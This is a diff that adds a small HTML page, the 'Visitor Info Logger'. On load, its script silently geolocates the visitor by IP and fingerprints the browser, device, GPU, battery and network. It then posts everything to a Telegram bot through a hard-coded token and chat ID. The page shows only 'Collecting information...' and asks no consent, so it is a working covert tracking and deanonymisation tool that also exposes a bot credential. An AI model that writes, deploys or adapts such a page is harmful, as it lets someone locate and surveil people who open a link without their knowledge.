@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Visitor Info Logger</title>
+  <script>
+    async function collectAndSendInfo() {
+      const ipInfo = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+
+      // Device & browser info
+      const visitorInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || "Unknown",
+        touchSupport: 'ontouchstart' in window,
+        browserOnline: navigator.onLine,
+        doNotTrack: navigator.doNotTrack
+      };
+
+      // GPU info
+      let gpuInfo = "Unavailable";
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch {}
+
+      // Battery info
+      let batteryLevel = "Unavailable";
+      try {
+        const battery = await navigator.getBattery();
+        batteryLevel = `${Math.round(battery.level * 100)}%`;
+      } catch {}
+
+      // Connection info
+      const connectionInfo = {
+        type: conn.type || "Unknown",
+        effectiveType: conn.effectiveType || "Unknown",
+        downlink: conn.downlink || "Unknown",
+        rtt: conn.rtt || "Unknown",
+        saveData: conn.saveData || false
+      };
+
+      // Time
+      const time = new Date().toLocaleString("en-GB");
+
+      const message = `
+🚀 New Visitor Detected:
+
+📌 Location: ${ipInfo.city || "Unknown"}, ${ipInfo.region || ""}, ${ipInfo.country || ""}
+🌍 Latitude: ${ipInfo.latitude || "?"}, Longitude: ${ipInfo.longitude || "?"}
+🌐 IP: ${ipInfo.ip || "Unknown"}
+🏢 ISP: ${ipInfo.org || "Unknown"} | ASN: ${ipInfo.asn || "Unknown"}
+
+📱 Device Info:
+• Platform: ${visitorInfo.platform}
+• Screen: ${visitorInfo.screenResolution}, Color Depth: ${visitorInfo.colorDepth}
+• User Agent: ${visitorInfo.userAgent}
+• Language: ${visitorInfo.language}, Timezone: ${visitorInfo.timezone}
+• RAM: ${visitorInfo.deviceMemory} GB, CPU Cores: ${visitorInfo.hardwareConcurrency}
+• Touch: ${visitorInfo.touchSupport}, Cookies: ${visitorInfo.cookiesEnabled}
+• Online: ${visitorInfo.browserOnline}, Do Not Track: ${visitorInfo.doNotTrack}
+• GPU: ${gpuInfo}, Battery: ${batteryLevel}
+
+📶 Network Info:
+• Type: ${connectionInfo.type}, Effective: ${connectionInfo.effectiveType}
+• Downlink: ${connectionInfo.downlink} Mbps, RTT: ${connectionInfo.rtt} ms
+• Save Data: ${connectionInfo.saveData}
+
+🕒 Time: ${time}
+🔗 Page URL: ${location.href}
+      `;
+
+      const token = "7677784138:AAFCrYWonjpH6kOpVn98_kREZS0e--fw0dg";
+      const chatId = "6857909966";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
+
+    window.onload = collectAndSendInfo;
+  </script>
+</head>
+<body>
+  <h2>Welcome</h2>
+  <p>Collecting information...</p>
+</body>
+</html>
